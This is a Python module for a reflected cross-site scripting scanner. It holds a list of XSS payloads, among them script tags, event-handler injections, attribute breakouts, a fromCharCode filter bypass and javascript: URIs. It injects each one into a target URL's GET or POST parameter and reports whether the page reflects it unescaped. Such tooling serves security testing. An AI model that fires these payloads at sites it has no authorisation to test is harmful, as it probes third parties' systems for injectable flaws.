"""test_xss() — Reflected Cross-Site Scripting (XSS) detection."""

import json
import re
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from utils.http_client import get_client

# ---------------------------------------------------------------------------
# XSS payloads — crafted to detect reflection without encoding
# ---------------------------------------------------------------------------

XSS_PAYLOADS: list[dict] = [
    # Basic script tags
    {
        "payload": "<script>alert('XSS')</script>",
        "check": "<script>alert('XSS')</script>",
        "context": "HTML body",
    },
    {
        "payload": "<img src=x onerror=alert('XSS')>",
        "check": "onerror=alert('XSS')",
        "context": "HTML attribute event handler",
    },
    {
        "payload": "<svg onload=alert('XSS')>",
        "check": "<svg onload=alert('XSS')>",
        "context": "SVG tag",
    },
    {
        "payload": "\"><script>alert('XSS')</script>",
        "check": "<script>alert('XSS')</script>",
        "context": "Attribute breakout",
    },
    {
        "payload": "'><script>alert('XSS')</script>",
        "check": "<script>alert('XSS')</script>",
        "context": "Single-quote attribute breakout",
    },
    # Event handlers
    {
        "payload": "\" onfocus=alert('XSS') autofocus=\"",
        "check": "onfocus=alert('XSS')",
        "context": "Event handler injection",
    },
    {
        "payload": "<body onload=alert('XSS')>",
        "check": "<body onload=alert('XSS')>",
        "context": "Body onload",
    },
    {
        "payload": "<input onfocus=alert('XSS') autofocus>",
        "check": "onfocus=alert('XSS')",
        "context": "Input autofocus",
    },
    # Encoding bypasses
    {
        "payload": "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
        "check": "onerror=alert(String.fromCharCode(88,83,83))",
        "context": "CharCode bypass",
    },
    {
        "payload": "<details open ontoggle=alert('XSS')>",
        "check": "ontoggle=alert('XSS')",
        "context": "Details/ontoggle",
    },
    # Protocol handlers
    {
        "payload": "javascript:alert('XSS')",
        "check": "javascript:alert('XSS')",
        "context": "JavaScript protocol",
    },
    # Template literal / backtick
    {
        "payload": "${alert('XSS')}",
        "check": "${alert('XSS')}",
        "context": "Template literal injection",
    },
    # Unique marker for reflection detection
    {
        "payload": "vntg3x55t3st",
        "check": "vntg3x55t3st",
        "context": "Reflection probe (harmless marker)",
    },
    # with HTML entities not decoded
    {
        "payload": "<iframe src=\"javascript:alert('XSS')\">",
        "check": "javascript:alert('XSS')",
        "context": "Iframe javascript src",
    },
    {
        "payload": "<marquee onstart=alert('XSS')>",
        "check": "onstart=alert('XSS')",
        "context": "Marquee onstart",
    },
]

# Patterns indicating the response might be encoding/sanitizing input
ENCODING_PATTERNS = [
    (re.compile(r"&lt;script", re.I), "HTML entity encoding (<)"),
    (re.compile(r"&gt;", re.I), "HTML entity encoding (>)"),
    (re.compile(r"&#x3C;|&#60;", re.I), "Numeric HTML encoding (<)"),
    (re.compile(r"%3C|%3E", re.I), "URL encoding"),
]


def _inject_param(url: str, param: str, payload: str) -> str:
    """Inject payload into query-string parameter."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _inject_body(data: str, param: str, payload: str) -> str:
    """Inject payload into URL-encoded POST body."""
    params = parse_qs(data, keep_blank_values=True)
    params[param] = [payload]
    return urlencode(params, doseq=True)


async def test_xss(
    url: str,
    param: str,
    method: str = "GET",
    data: str = "",
) -> str:
    """Test a parameter for reflected Cross-Site Scripting (XSS) vulnerabilities.

    Injects common XSS payloads into the specified parameter and checks if
    they are reflected in the response without proper encoding or sanitization.

    Args:
        url: The target URL (for GET, include query string with the param).
        param: The parameter name to inject XSS payloads into.
        method: HTTP method — "GET" or "POST" (default "GET").
        data: URL-encoded POST body (only for POST method).

    Returns:
        JSON string with findings for each payload and sanitization analysis.
    """
    method = method.upper()
    findings: list[dict] = []
    sanitization_detected: list[str] = []
    reflected_but_encoded = 0

    async with get_client(follow_redirects=True, verify_ssl=False) as client:
        for entry in XSS_PAYLOADS:
            payload = entry["payload"]
            check = entry["check"]
            context = entry["context"]

            try:
                if method == "GET":
                    test_url = _inject_param(url, param, payload)
                    resp = await client.get(test_url)
                else:
                    injected = _inject_body(data, param, payload)
                    resp = await client.post(
                        url,
                        content=injected,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                    )

                body = resp.text

                # Check if payload is reflected unescaped
                if check in body:
                    findings.append({
                        "payload": payload,
                        "context": context,
                        "status_code": resp.status_code,
                        "reflected_unescaped": True,
                        "vulnerable": True,
                    })
                else:
                    # Check if it's reflected but encoded
                    for pat, encoding_type in ENCODING_PATTERNS:
                        if pat.search(body) and payload.replace("<", "").replace(">", "")[:10] in body.lower():
                            reflected_but_encoded += 1
                            if encoding_type not in sanitization_detected:
                                sanitization_detected.append(encoding_type)
                            break

            except Exception:
                continue

    vulnerable_count = sum(1 for f in findings if f.get("vulnerable"))

    return json.dumps({
        "target": url,
        "param": param,
        "method": method,
        "total_payloads_tested": len(XSS_PAYLOADS),
        "vulnerable_findings": vulnerable_count,
        "reflected_but_encoded": reflected_but_encoded,
        "sanitization_detected": sanitization_detected,
        "findings": findings,
    }, indent=2)
